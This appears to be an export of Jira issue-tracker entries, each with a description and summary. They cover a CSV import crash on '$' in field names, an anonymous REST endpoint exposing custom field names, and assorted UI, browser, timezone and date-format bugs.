Importing a CSV file to a project will fail if one of the custom field name contains "$" or "/"

h2. Why

Full stack trace is
{noformat}
java.lang.StringIndexOutOfBoundsException: String index out of range: 30
	at java.lang.String.charAt(String.java:686)
	at java.util.regex.Matcher.appendReplacement(Matcher.java:711)
	at java.util.regex.Matcher.replaceFirst(Matcher.java:861)
	at java.lang.String.replaceFirst(String.java:2146)
	at com.atlassian.jira.plugins.importer.imports.csv.web.CsvFieldMappingsPage.doValidation(CsvFieldMappingsPage.java:96)
	at webwork.action.ActionSupport.validate(ActionSupport.java:391)
	at webwork.action.ActionSupport.execute(ActionSupport.java:162)
	at com.atlassian.jira.action.JiraActionSupport.execute(JiraActionSupport.java:82)
	at com.atlassian.jira.plugins.importer.web.ImporterProcessSupport.execute(ImporterProcessSupport.java:145)
{noformat}

The code is actually failing when executing this:

{noformat}
"field-41fcad5ea614a849560409df318c4534".replaceFirst("field-41fcad5ea614a849560409df318c4534", "field.Original Cost Estimate $");
{noformat}

That looks harmless enough, but the replaceFirst method is a bit stupid, from its [Javadoc|http://docs.oracle.com/javase/6/docs/api/java/lang/String.html#replaceFirst(java.lang.String, java.lang.String)]


h2. The fix
Use Matcher.quoteReplacement

h3. The workaround

* Open CSV file and replace '$' by something else in the first row (like 'in dollars')
* Re-import csv file

h3. Note
This happened on [this support case|https://support.atlassian.com/browse/JST-59665?focusedCommentId=3466382&page=com.atlassian.jira.plugin.system.issuetabpanels:comment-tabpanel#comment-3466382].
fields.summary: CSV Import fails if custom field name contains "$" or "/"

fields.description:
On an instance with no anonymous access enabled, /rest/gadget/1.0/statTypes returns a list of all stattable custom fields (names and IDs) in the instance in response to anonymous requests.

This is a nasty exposure of data - admins have no way of knowing that private data shouldn't be put into custom field names. For example, on our own private JIRA instance for tracking QA recruitment, the field names give a fair bit of information away about the intent of the questions and the attributes we're judging candidates by.

I know we don't have field-level permissions, but there's got to be some existing permission we can sensibly enforce on this REST API to limit the exposure.

Discovered by [~hnguyen@atlassian.com] .
fields.summary: statTypes REST API exposes all statistics field names anonymously

fields.description:
UPM: https://ecosystem.atlassian.net/browse/UPM-3658

To replicate:
# Go to the Manage Add-ons screen (screenshot 1); there's a link called "Upload add-on".
# Click the link and choose an add-on file to upload.
# Click the "Upload" button; the progress dialog that appears next (screenshot 2) talks about "downloading", not "uploading" as in the previous dialog and screen.
fields.summary: After choosing to "upload" a plugin, ensuing dialog talks about "downloading"

fields.description:
After the May 13th upgrade, some fields that have a drop-down behavior, like 'Component/s', 'Labels' and 'Affected Version/s', 'Fix Version/s' can not be populated anymore, and JIRA does not display pre-configured suggestions. 

Internet Explorer does not completely load the page, since a warning message appears at the footer of the browser: "Done, but with errors on page."

This happens while creating issues. Editing issues seems fine.

Workaround:
Enable native XMLHTTP support:
* Go to 'Internet Options'
* Advanced tab
* Check the 'Enable XMLHTTP native support' option within 'Security' section
* Close your browser
fields.summary: Drop-down-like fields not showing available options when using Internet Explorer 8

{noformat}
Cause:
java.lang.IllegalArgumentException: Invalid complete key specified: -1
{noformat}

Steps to reproduce:

(while creating the custom field...)
* Choose any field type, click next.
* Select the search template as “None”.
* Click on Next and the error is displayed.
fields.summary: Error while creating custom field

fields.description:
Steps:
1. Create an issue.
2. Delete the issue.

Expected: A generic 'The issue has been deleted' message, or more detail if it's available.
Actual: The notification message displays its format object.
fields.summary: Deleting an issue results in notification message '{0} has been deleted'

fields.description:
The issue navigator title remains as the issue page title after clicking on the Return To Search.

*Steps to Replicate*
# Search for Issues
# Click on one of the Issue
# Click on Return to search link at the top right corner to return to search result
# Noticed that the title of the search remains as the issue's page title

*Expected behavior*
Return to "Issue Navigator - Instance Name"

*Screenshot*
!error.JPG!
fields.summary: Issue Navigator Title Does Not Refresh When Return to Search

fields.description:
h5. Steps to Reproduce
# Create an issue 
# Update "View Issue" permission for that project so users cannot see the issue
# Directly access the issue using {{http://JIRA_HOST/browse/ISSUEKEY}}
# Test using Chrome vs IE8

h5. Expected Results
Permission Violation Error as seen in Chrome Screenshot

h5. Actual Results
IE Permission error pops up, then disappears after a minute or so

(i) One interesting thing to note is that when browsing the issue key directly in IE8, the URL is redirected to {{http://JIRA_HOST/i#browse/ISSUEKEY}}. Just an observation as I don't think it is related to the error.
fields.summary: Strange Error in IE8 when Browsing Issue without Permission

fields.description:
h2. Steps to reproduce

Set conditions on your workflow transition (new or existing) and choose "Any of these conditions" from the dropdown.  Publish this change.

If you now go to admin > workflows > and view this workflow, on the conditions tab it shows "*All* of the following conditions" in the dropdown, even though the actual value is *Any*. (see screen shot)

_functionality is not affected, just the display_
fields.summary: When viewing active workflow transition, conditions always show as "All" and does not reflect actual setting

fields.description:
Searching for issues which have underscore in their summary does not come up in JIRA

*How to reproduce?*

- Create an issue with a summary like: ABD_ON_SHINE_DEC13_TRQXM455
- Searching for "SHINE" only does not return the above issue
- However, if you search for "SHINE*" of the full summary it will return it.
fields.summary: Searching for issues which have underscore in their summary does not come up in JIRA

fields.description:
*Steps to produce*
# Create a filter, for example: {{project = test AND status = Open}}.
# Create any ticket with status open and make sure is visible by the above filter.
# Click on the ticket to open (*don't open it in new window, has to be same window*)
# Change the status of the ticket and click on *Return to Search*.


*Expected Results*
The filter shouldn't show the issue since the status of the issue has been changed, thus shouldn't be visible according to the filter {{project = test AND status = Open}}.

*Actual Results*
The filter is still showing the issue, even though the status field has been changed but the issue is still visible. Refer to the screenshot
fields.summary: Filters don't refresh the results after clicking Return to Search link on the default screen of issues

fields.summary: OOME in JIRA Create Meta Rest Endpoint

fields.description:
Active Jira Gliffy add-ons that are unlicensed display a GLIFFY IS UNLICENSED message in the More drop down menu of a Jira Issue:
!gliffy_unlicensed.jpeg!

Affected Version: 6.2-OD-10-004-WN

*Workaround:*
* To remove the message, deactivate the Gliffy Add-onn from the Add-ons manager. (note that you'll have to manually enable it if a future license is purchased)

Note:
There is also a Confluence Issue about Gliffy also displaying a banner in Confluence when unlicensed: [CONF-32307|https://jira.atlassian.com/browse/CONF-32307]
fields.summary: Gliffy behaviour in OnDemand when unlicensed

fields.description:
When sharing an issue in JIRA ondemand-fireball-216-11-gffe2c38, scrolling to the bottom of the share dialog causes it to dissapear, losing content

To reproduce:

1. Open https://sdog.jira.com/browse/JSTDEV-2666
2. Click the "share" button
3. Enter some large-ish (say, three paragraphs) text and some people
4. Scroll to the bottom of the share content pane, watch the floating share dialog dissapear, along with all your content.
5. Scream, loudly.
fields.summary: When sharing an issue in JIRA ondemand-fireball-216-11-gffe2c38, scrolling to the bottom of the share dialog causes it to dissapear, losing content

fields.description:
Per this documentation: 
https://confluence.atlassian.com/display/AOD/Clearing+'Remember+my+login'+Tokens

The remember my login feature is unavailable.
fields.summary: JIRA OnDemand > Clearing 'Remember my login' Tokens Document

fields.description:
Adding a bitbucket team account to your OnDemand instance creates a link from the Application Navigator.

Accessing the 'Application Navigator' menu from https://<instance>/plugins/servlet/customize-application-navigator displays a 'Manage' option for each link.

The 'Bitbucket' manage link redirects to:
https://bitbucket.org/plugins/servlet/customize-application-navigator

The address returns a 404 message to the user.

*Workaround:*
To disable the bitbucket option from the application navigator, select 'Hide' checkbox and apply changes.
fields.summary: Application Navigator redirects to 404 from 'Manage' link

fields.description: See attached screenshot. The JIRA Default timezone is set to Brisbane, the User preference is set to Perth. The time in the title (hover) is correct for Perth. The time listed is incorrect (JIRA Default timezone). The activity tab does not have this problem.
fields.summary: Incorrect timestamps in History

fields.description:
JIRA date picker returning wrong format. It's not respecting configuration in General Configuration.

Date picker returning value in format *dd/MM/yy* in JIRA version date fields where JIRA default is expecting *d/MMM/yy*. However, there's no problem with issues date fields e.g. Due Date since the value returned match the expected format - *d/MMM/yy*.

This issue is still affecting users who have custom date format set in JIRA General Configuration.

*Workaround*:
* Revert the date picker format(not the ones in Look and Feel) to default.
* Manually change the month in selected date using picker from numeric to its abbreviation e.g. 10 -> Oct.
fields.summary: JIRA date picker returning wrong format - not respecting configuration in General Configuration

fields.description:
Screenshot attached.

The workaround is to go through: "More Actions" > "Log Work"
fields.summary: Clicking on the "+" icon on the Time Tracking area of a ticket does not take you to the worklog form

fields.description:
JIRA sends subscribed filter results using server time, not user time.

My time zone is GMT+2, server zone is GMT-5.
I configured weekly subscription - on Mon, at 10:00am, see screenshot.
But I recieve subscription on Mondays at 5:00pm, 7 hours difference between GMT+2 & GMT-5.
See screenshot.
fields.summary: Time setting for subscribed filter ingores time-zone setting for user
